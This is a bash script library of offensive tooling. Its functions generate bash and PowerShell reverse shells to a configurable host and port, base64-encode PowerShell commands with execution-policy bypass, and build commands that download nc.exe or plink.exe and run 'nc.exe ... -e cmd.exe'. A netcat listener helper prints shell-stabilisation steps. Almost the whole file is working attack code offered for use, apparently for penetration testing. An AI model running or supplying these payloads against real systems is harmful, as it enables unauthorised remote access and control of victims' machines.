#!/bin/bash

get_bash_reverse_shell() {
    if [ -z "$host_port" ]; then
        host_port=4444  # Default reverse shell port
    fi
    if [ -z "$host_ip" ]; then
        host_ip=$(get_host_ip)  # Function to get the host IP address
    fi
    if [ -z "$1" ]; then
        reverse_shell='bash -c "bash -i >& /dev/tcp/'"$host_ip"'/'"$host_port"' 0>&1"'
    else
        reverse_shell='bash -i >& /dev/tcp/'"$host_ip"'/'"$host_port"' 0>&1'
    fi
    echo "$reverse_shell"
}

encode_powershell() {
    if [ -z "$1" ]; then
        echo "Usage: powershell_base64 <string>"
        return 1
    fi
    local input_string="$1"
    local encoded_string=$(echo "$input_string" | iconv -t UTF-16LE | base64 | tr -d '\n')
    echo "powershell -ep bypass -nop -nol -noni -ec $encoded_string"
}

get_powershell_reverse_shell() {    
    if [ ! -z "$1" ]; then
        host_port=$1
    fi
    if [ -z "$host_port" ]; then
        host_port=4444
    fi
    if [ ! -z "$2" ]; then
        host_ip=$2
    fi
    if [ -z "$host_ip" ]; then
        host_ip=$(get_host_ip)  # Function to get the host IP address
    fi
    reverse_shell=$(cat $SCRIPTDIR/../ps1/reverse_shell.ps1 | sed -E 's/^\$host_port=.*/\$host_port='$host_port';/g' | sed -E 's/^\$host_ip=.*/\$host_ip="'$host_ip'";/g' )
    reverse_shell=$(echo "$reverse_shell" | tr '\n' ' ' | sed -E 's/[[:space:]][[:space:]]+/\ /g')
    if [ "$encode_shell" == "false" ]; then
        echo "$reverse_shell"
        return 0
    fi
    echo $(encode_powershell "$reverse_shell")
}

get_powershell_reverse_shell_cmd() {    
    if [ ! -z "$1" ]; then
        host_port=$1
    fi
    if [ -z "$host_port" ]; then
        host_port=4444
    fi
    if [ ! -z "$2" ]; then
        host_ip=$2
    fi
    if [ -z "$host_ip" ]; then
        host_ip=$(get_host_ip)  # Function to get the host IP address
    fi
    reverse_shell=$(cat $SCRIPTDIR/../ps1/reverse_shell_cmd.ps1 | sed -E 's/^\$host_port=.*/\$host_port='$host_port';/g' | sed -E 's/^\$host_ip=.*/\$host_ip="'$host_ip'";/g' )
    reverse_shell=$(echo "$reverse_shell" | tr '\n' ' ' | sed -E 's/[[:space:]][[:space:]]+/\ /g')
    reverse_shell=$(echo "$reverse_shell" | sed -E 's/ =/=/g' | sed -E 's/= /=/g' | sed -E 's/; /;/g')
    reverse_shell=$(echo "$reverse_shell" | sed -E 's/ \{/\{/g' | sed -E 's/\{ /\{/g' | sed -E 's/ \}/\}/g' | sed -E 's/\} /\}/g')
    reverse_shell=$(echo "$reverse_shell" | sed -E 's/if /if/g' | sed -E 's/while /while/g' | sed -E 's/try /try/g')
    if [ "$encode_shell" == "false" ]; then
        echo "$reverse_shell"
        return 0
    fi
    echo $(encode_powershell "$reverse_shell")
}


get_powershell_interactive_shell() {
    if [ ! -z "$1" ]; then
        host_port=$1
    fi
    if [ -z "$host_port" ]; then
        host_port=4444
    fi
    if [ ! -z "$2" ]; then
        host_ip=$2
    fi
    if [ -z "$host_ip" ]; then
        host_ip=$(get_host_ip)  # Function to get the host IP address
    fi
    if [ -z "$http_ip" ]; then
        echo "HTTP IP address must be set before running interactive shell."
        return 1
    fi
    if [ -z "$http_port" ]; then
        echo "HTTP port must be set before running interactive shell."
        return 1
    fi
    cp $SCRIPTDIR/../ps1/reverse_interactive_shell.ps1 reverse_interactive_shell.ps1
    sed -i -E 's/\{host_port\}/"'$host_port'";/g' reverse_interactive_shell.ps1
    sed -i -E 's/\{host_ip\}/"'$host_ip'";/g' reverse_interactive_shell.ps1
    local stty_size=$(stty size)
    local stty_rows=$(echo "$stty_size" | awk '{print $1}')
    local stty_cols=$(echo "$stty_size" | awk '{print $2}')
    sed -i -E 's/\{stty_rows\}/"'$stty_rows'";/g' reverse_interactive_shell.ps1
    sed -i -E 's/\{stty_cols\}/"'$stty_cols'";/g' reverse_interactive_shell.ps1
    reverse_shell=$(cat $SCRIPTDIR/../ps1/reverse_interactive_shell_stub.ps1 | sed -E 's/\$\{http_ip\}/'$http_ip'/g' | sed -E 's/\$\{http_port\}/'$http_port'/g')
    if [ "$encode_shell" == "false" ]; then
        echo "$reverse_shell"
        return 0
    fi
    echo $(encode_powershell "$reverse_shell")

}

get_windows_binaries_powershell() {
    local windows_binary="$1"
    if [ -z "$windows_binary" ]; then
        echo "Windows binary must be specified."
        return 1
    fi
    windows_binary_fullpath="/usr/share/windows-resources/binaries/$windows_binary"
    if [ -f "$windows_binary_fullpath" ]; then
        cp "$windows_binary_fullpath" .
    fi
    if [ -f "$windows_binary" ]; then
        if [ -z "$http_ip" ]; then
            echo "HTTP IP address must be set before running interactive shell."
            return 1
        fi
        if [ -z "$http_port" ]; then
            echo "HTTP port must be set before running interactive shell."
            return 1
        fi        
        download="iwr -Uri http://$http_ip:$http_port/plink.exe -OutFile"' C:\windows\temp\plink.exe;'
        if [ "$encode_shell" == "false" ]; then
            echo "$download"
            return 0
        fi
        echo $(encode_powershell "$download")
      fi
}

get_nc_reverse_shell_powershell() {
    cp /usr/share/windows-resources/binaries/nc.exe .
    if [ -f "nc.exe" ]; then
        if [ -z "$host_port" ]; then
            host_port=4444  # Default reverse shell port
        fi
        if [ -z "$host_ip" ]; then
            host_ip=$(get_host_ip)  # Function to get the host IP address
        fi
        if [ -z "$http_ip" ]; then
            echo "HTTP IP address must be set before running interactive shell."
            return 1
        fi
        if [ -z "$http_port" ]; then
            echo "HTTP port must be set before running interactive shell."
            return 1
        fi        
        reverse_shell="iwr -Uri http://$http_ip:$http_port/nc.exe -OutFile"' C:\windows\temp\nc.exe;'
        reverse_shell+='C:\windows\temp\nc.exe '"$host_ip $host_port -e cmd.exe"
        if [ "$encode_shell" == "false" ]; then
            echo "$reverse_shell"
            return 0
        fi
        echo $(encode_powershell "$reverse_shell")
     fi

}

start_listener() {
    if [ -z "$host_port" ]; then
        host_port=4444  # Default reverse shell port
    fi
    if [ -z "$trail_log" ]; then
        trail_log="trail.log"
    fi
    local stty_size=$(stty size)
    local terminal_type=$(echo $TERM)
    local stty_rows=$(echo "$stty_size" | awk '{print $1}')
    local stty_columns=$(echo "$stty_size" | awk '{print $2}')
    echo "stty rows: $stty_rows, columns: $stty_columns"
    echo "terminal type: $terminal_type"
    echo "Starting listener on port $host_port..."
    echo "/bin/sh -i"
    echo "/usr/bin/script -qc /bin/bash /dev/null"
    echo "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'"
    echo "python3 -c 'import pty; pty.spawn(\"/bin/sh\")'"
    echo "Ctrl-Z"
    echo "stty -a"
    echo "stty raw -echo; fg"
    echo "export TERM=$terminal_type; export SHELL=bash; stty rows $stty_rows columns $stty_columns; reset"
    netcat_options="-k -l -v -n -p $host_port"
    echo "Netcat options: $netcat_options"
    # for interactive
    if [ ! -z "$interactive_shell" ]; then
        stty raw -echo; (stty size; cat) | nc $netcat_options 2>&1 | tee >(remove_color_to_log >> $trail_log)
    else
        nc $netcat_options 2>&1 | tee >(remove_color_to_log >> $trail_log)
    fi
}

is_listener_running() {
    if [ ! -z "$1" ]; then
        host_port=$1
    fi
    if [ -z "$host_port" ]; then
        host_port=4444  # Default reverse shell port
    fi
    running=$(pgrep -f "nc -k -l -v -n -p $host_port")
    if [[ $running ]]; then
        echo "Listener is running on port $host_port."
        return 0
    else
        echo "No listener is running on port $host_port."
        return 1
    fi
}

start_listener_command() {
    current_dir=$(pwd)
        
}